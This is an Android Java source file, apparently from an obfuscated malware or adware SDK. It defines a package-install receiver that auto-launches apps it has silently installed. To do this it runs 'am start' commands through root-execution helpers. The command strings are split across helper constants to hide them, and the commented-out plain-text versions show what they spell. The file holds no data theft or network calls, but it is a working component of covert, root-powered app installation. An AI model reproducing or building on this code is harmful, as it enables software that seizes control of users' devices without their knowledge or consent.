package kdui.uj.tkd.kdg.receiver;

import kdui.uj.tkd.kdg.data.SharePreferenceSdkData;
import kdui.uj.tkd.kdg.utils.BlazeFireUtil;
import kdui.uj.tkd.kdg.utils.KingsExecuteRoot;
import kdui.uj.tkd.kdg.utils.StrHelp1;
import kdui.uj.tkd.kdg.utils.StrHelp2;
import kdui.uj.tkd.kdg.utils.StrHelp3;
import android.app.ActivityManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;


public class PackageReceiver extends BroadcastReceiver{

	@Override
	public void onReceive(Context context, Intent intent) {
		String action = intent.getAction();
		if(Intent.ACTION_PACKAGE_ADDED.equals(action)) {
			PackageManager pm = context.getPackageManager();
            String packageName = intent.getData().getSchemeSpecificPart();
            String silentInstallingPackage = SharePreferenceSdkData.getSilentInstallingPackage(context);
            if(silentInstallingPackage != null && silentInstallingPackage.contains(packageName)) {
            	Intent launchIntentForPackage = pm.getLaunchIntentForPackage(packageName);
            	if(launchIntentForPackage != null) {
            		launchIntentForPackage.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            		context.startActivity(launchIntentForPackage);
            	}else {
            		//使用am命令启动应用
            		startPackageByAM(silentInstallingPackage);
            	}
            	
            	ActivityManager am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
            	am.restartPackage(packageName);
            	
            	SharePreferenceSdkData.setSilentInstallingPackage(context, "");
            }
		}
	}
	
	private void startPackageByAM(String pkgInfo) {
//		String cmd = "am start --user 0 -n " + pkgInfo;
//		String cmd = StrHelp1.A_PREFIX+StrHelp2.PACK_RECEIVER+StrHelp3.PACK_RECEIVER + pkgInfo;
		String cmd =  new StringBuffer( StrHelp1.A_PREFIX).append(StrHelp2.PACK_RECEIVER).append(StrHelp3.PACK_RECEIVER).toString() + pkgInfo;
		if (Build.VERSION.SDK_INT <= 15) {
//			cmd = "am start -n " + pkgInfo;
//			cmd = StrHelp1.A_PREFIX+StrHelp2.PACK_RECEIVER1+StrHelp3.PACK_RECEIVER1 + pkgInfo;
			cmd = new StringBuffer(StrHelp1.A_PREFIX).append(StrHelp2.PACK_RECEIVER1).append(StrHelp3.PACK_RECEIVER1).toString() + pkgInfo;
		}
		if(BlazeFireUtil.hasRoot()) {
			BlazeFireUtil.makeCmd("LD_LIBRARY_PATH=/vendor/lib:/system/lib " + cmd);
		} else {
			KingsExecuteRoot.getExecuteRoot(false).runCommand(cmd);
		}
	}

}
